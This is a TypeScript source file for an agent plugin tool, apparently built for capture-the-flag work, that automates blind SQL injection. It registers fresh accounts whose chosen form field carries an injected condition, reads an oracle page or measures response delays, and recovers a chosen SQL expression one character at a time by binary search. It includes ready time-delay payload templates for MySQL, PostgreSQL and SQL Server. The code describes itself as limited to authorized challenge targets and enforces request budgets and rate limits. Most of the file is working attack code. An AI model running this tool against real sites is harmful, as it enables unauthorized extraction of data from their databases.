import { tool } from "@opencode-ai/plugin"
import { existsSync } from "node:fs"
import { mkdir, readFile, writeFile } from "node:fs/promises"
import path from "node:path"
import { BudgetStopError, CtfRequestBudget, writeProbeEvidence } from "../lib/ctf-request-budget.ts"
import {
  directoryFromContext,
  resolveFromDirectoryInsideWorkspace,
  workspaceRootFromContext,
} from "../lib/workspace-path.ts"
import { normalizeUrl } from "../lib/web-http.ts"

function safeSlug(value: string) {
  return (
    value
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, "")
      .slice(0, 60) || "blind-sqli"
  )
}
function replaceAll(template: string, values: Record<string, string>) {
  return Object.entries(values).reduce((text, [key, value]) => text.replaceAll(`{${key}}`, value), template)
}
function encodeForm(fields: Record<string, string>) {
  return new URLSearchParams(fields).toString()
}
export function defaultTimeConditionTemplate(database: string | undefined) {
  switch ((database || "mysql").toLowerCase()) {
    case "postgres":
    case "postgresql":
      return "CASE WHEN ({condition}) THEN pg_sleep({delaySeconds}) ELSE pg_sleep(0) END"
    case "mssql":
    case "sqlserver":
      return "IF ({condition}) WAITFOR DELAY '00:00:{delaySeconds}'"
    case "mysql":
    case "mariadb":
      return "IF(({condition}),SLEEP({delaySeconds}),0)"
    default:
      return undefined
  }
}

type Checkpoint = {
  result: string
  nextPosition: number
  oracleVerified: boolean
  updatedAt: string
  requests: number
  completed: boolean
  stopReason?: string
}

export default tool({
  description:
    "Bounded CTF blind SQLi oracle with unique registration identities, boolean/time-compatible response oracles, binary search, rate limiting, exponential backoff, checkpoints, partial results, and fail-closed connection-reset handling. Use only against an authorized challenge target.",
  args: {
    baseUrl: tool.schema.string().describe("Challenge base URL"),
    registrationPath: tool.schema.string().describe("Registration route, e.g. /register"),
    parameter: tool.schema.string().default("email").describe("Injection parameter"),
    oracleUrl: tool.schema.string().describe("Oracle route template containing {username}"),
    oracleSelector: tool.schema.string().describe("Exact text marker that indicates a true boolean oracle"),
    payloadTemplate: tool.schema
      .string()
      .describe("Template containing {prefix}, {condition}, and optionally {unique}"),
    expression: tool.schema.string().describe("SQL scalar expression to extract"),
    method: tool.schema
      .enum(["binary-search", "time"])
      .optional()
      .describe("Boolean binary-search is default; time uses a bounded delay oracle"),
    database: tool.schema
      .string()
      .optional()
      .describe("mysql|mariadb|postgres|mssql; used only when timeConditionTemplate is omitted"),
    timeConditionTemplate: tool.schema
      .string()
      .optional()
      .describe("Time payload expression containing {condition}, {delaySeconds}, or {delayMs}"),
    maxLength: tool.schema.number().optional(),
    charset: tool.schema.string().optional().describe("Candidate characters, default printable ASCII"),
    usernameField: tool.schema.string().optional(),
    passwordField: tool.schema.string().optional(),
    registrationExtraJson: tool.schema.string().optional().describe("JSON object of extra registration fields"),
    sessionCookie: tool.schema.string().optional(),
    reuseSession: tool.schema
      .boolean()
      .optional()
      .describe("Reuse the session cookie and Set-Cookie values across bounded requests; default true"),
    maxRequests: tool.schema.number().optional().describe("Total request budget, default 30"),
    maxStateChangingRequests: tool.schema.number().optional().describe("Registration/write budget, default 10"),
    minIntervalMs: tool.schema.number().optional().describe("Minimum interval between requests, default 800ms"),
    delayMs: tool.schema.number().optional().describe("Time oracle threshold and pacing delay, default 1500ms"),
    maxFailures: tool.schema.number().optional().describe("Stop after this many ordinary request failures, default 2"),
    checkpointFile: tool.schema.string().optional().describe("Workspace-relative checkpoint JSON path"),
    challenge: tool.schema.string().optional().describe("Evidence/challenge slug"),
  },
  async execute(args, context) {
    const directory = directoryFromContext(context)
    const workspace = workspaceRootFromContext(context)
    const base = new URL(normalizeUrl(args.baseUrl))
    const registration = new URL(args.registrationPath, base)
    const method = args.method || "binary-search"
    const maxLength = Math.max(1, Math.min(Math.floor(args.maxLength ?? 32), 256))
    const charset = [...(args.charset || String.fromCharCode(...Array.from({ length: 95 }, (_, i) => i + 32)))]
      .filter((value, index, all) => all.indexOf(value) === index)
      .sort((a, b) => a.charCodeAt(0) - b.charCodeAt(0))
    if (charset.length === 0) throw new Error("charset must contain at least one character")
    const delayMs = Math.max(250, Math.floor(args.delayMs ?? 1_500))
    const timeTemplate = args.timeConditionTemplate || defaultTimeConditionTemplate(args.database)
    if (method === "time" && !timeTemplate) {
      throw new Error(
        "time method requires timeConditionTemplate or a supported database (mysql, mariadb, postgres, mssql).",
      )
    }
    const budget = new CtfRequestBudget(
      {
        maxRequests: args.maxRequests,
        maxStateChangingRequests: args.maxStateChangingRequests,
        minIntervalMs: Math.max(args.minIntervalMs ?? 800, method === "time" ? delayMs : 0),
        stopOnConnectionReset: true,
        reuseSession: args.reuseSession ?? true,
        baseBackoffMs: 500,
        maxBackoffMs: 8_000,
        maxConsecutiveFailures: Math.max(1, Math.floor(args.maxFailures ?? 2)),
        allowedOrigin: base.origin,
      },
      args.sessionCookie,
    )
    const challenge = args.challenge || base.host
    const checkpointPath = resolveFromDirectoryInsideWorkspace(
      directory,
      workspace,
      args.checkpointFile || path.join("work", "ctf-evidence", safeSlug(challenge), "blind-sqli-checkpoint.json"),
    )
    await mkdir(path.dirname(checkpointPath), { recursive: true })
    let checkpoint: Checkpoint | undefined
    if (existsSync(checkpointPath)) {
      try {
        checkpoint = JSON.parse(await readFile(checkpointPath, "utf8")) as Checkpoint
      } catch {
        checkpoint = undefined
      }
    }
    let result = checkpoint?.result || ""
    let nextPosition = Math.max(1, checkpoint?.nextPosition || result.length + 1)
    let oracleVerified = checkpoint?.oracleVerified || false
    let failureCount = 0
    let completed = checkpoint?.completed ?? false
    let stopReason: string | undefined = checkpoint?.stopReason
    const observations: Array<Record<string, unknown>> = []
    let currentPosition = nextPosition
    let extra: Record<string, string> = {}
    if (args.registrationExtraJson?.trim()) {
      const parsed = JSON.parse(args.registrationExtraJson)
      if (!parsed || typeof parsed !== "object" || Array.isArray(parsed))
        throw new Error("registrationExtraJson must be a JSON object")
      extra = Object.fromEntries(
        Object.entries(parsed)
          .filter(([, value]) => ["string", "number", "boolean"].includes(typeof value))
          .map(([key, value]) => [key, String(value)]),
      )
    }

    async function saveCheckpoint(position: number, reason?: string) {
      const value: Checkpoint = {
        result,
        nextPosition: position,
        oracleVerified,
        updatedAt: new Date().toISOString(),
        requests: budget.requests,
        completed,
        ...(reason ? { stopReason: reason } : {}),
      }
      await writeFile(checkpointPath, `${JSON.stringify(value, null, 2)}\n`, "utf8")
    }

    async function oracle(position: number, condition: string, prefix: string): Promise<boolean> {
      const unique = `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`
      const conditionPayload =
        method === "time"
          ? replaceAll(timeTemplate!, {
              condition,
              delaySeconds: (delayMs / 1_000).toFixed(3),
              delayMs: String(delayMs),
            })
          : condition
      const payload = replaceAll(args.payloadTemplate, { prefix, condition: conditionPayload, unique })
      const username = `ctf_${unique}`
      const fields = {
        ...extra,
        [args.parameter]: payload,
        [args.usernameField || "username"]: username,
        [args.passwordField || "password"]: `${unique}!Aa9`,
      }
      try {
        const registered = await budget.request(
          registration,
          {
            method: "POST",
            headers: { "content-type": "application/x-www-form-urlencoded" },
            body: encodeForm(fields),
          },
          true,
          `register-oracle-${position}`,
        )
        observations.push({ ...registered.observation })
        const oracleURL = new URL(replaceAll(args.oracleUrl, { username, unique }), base)
        const response = await budget.request(oracleURL, { method: "GET" }, false, `oracle-${position}`)
        observations.push({ ...response.observation })
        const selectorTrue = response.text.includes(args.oracleSelector)
        const timeTrue = response.observation.elapsedMs >= delayMs
        oracleVerified = oracleVerified || (method === "time" ? timeTrue : selectorTrue)
        return method === "time" ? timeTrue : selectorTrue
      } catch (error) {
        if (error instanceof BudgetStopError) throw error
        failureCount++
        if (failureCount >= Math.max(1, Math.floor(args.maxFailures ?? 2))) {
          budget.routeState = "blocked"
          throw new BudgetStopError(
            "unstable",
            `Stopped after ${failureCount} ordinary request failures: ${error instanceof Error ? error.message : String(error)}`,
          )
        }
        throw error
      }
    }

    try {
      if (!completed) {
        for (let position = nextPosition; position <= maxLength; position++) {
          currentPosition = position
          const hasValue = await oracle(
            position,
            `${args.expression} IS NOT NULL AND LENGTH((${args.expression})) >= ${position}`,
            result,
          )
          if (!hasValue) {
            completed = true
            stopReason = "value_ended"
            nextPosition = position
            await saveCheckpoint(nextPosition, stopReason)
            break
          }
          let low = 0
          let high = charset.length - 1
          let found = ""
          while (low <= high) {
            const middle = Math.floor((low + high) / 2)
            const code = charset[middle].charCodeAt(0)
            const yes = await oracle(position, `ASCII(SUBSTR((${args.expression}),${position},1)) >= ${code}`, result)
            if (yes) {
              found = charset[middle]
              low = middle + 1
            } else high = middle - 1
          }
          if (!found) {
            stopReason = "character_not_in_charset"
            break
          }
          result += found
          nextPosition = position + 1
          await saveCheckpoint(nextPosition)
        }
        if (!stopReason && nextPosition > maxLength) {
          completed = true
          stopReason = "max_length_reached"
          await saveCheckpoint(nextPosition, stopReason)
        }
      }
    } catch (error) {
      stopReason =
        error instanceof BudgetStopError
          ? `${error.code}: ${error.message}`
          : error instanceof Error
            ? error.message
            : String(error)
      if (error instanceof BudgetStopError || failureCount >= (args.maxFailures ?? 2))
        budget.routeState = budget.routeState === "ready" ? "blocked" : budget.routeState
      nextPosition = Math.max(1, currentPosition)
      await saveCheckpoint(nextPosition, stopReason)
    }

    const payload = {
      tool: "ctf-web-blind-sqli",
      target: base.toString(),
      result,
      partial: !completed,
      completed,
      next_position: nextPosition,
      requests: budget.requests,
      state_changing_requests: budget.stateChangingRequests,
      observations: budget.observations,
      oracle_verified: oracleVerified,
      route_state: budget.routeState,
      stop_reason: stopReason,
      checkpoint: checkpointPath,
      next_probe:
        stopReason && !completed
          ? "resume with the same checkpoint after stabilizing the route or increasing a bounded budget"
          : "verify the candidate through an independent read-only oracle",
      failure_count: failureCount,
    }
    const evidenceRef = await writeProbeEvidence(directory, challenge, payload)
    return JSON.stringify({ ...payload, evidence_ref: evidenceRef }, null, 2)
  },
})
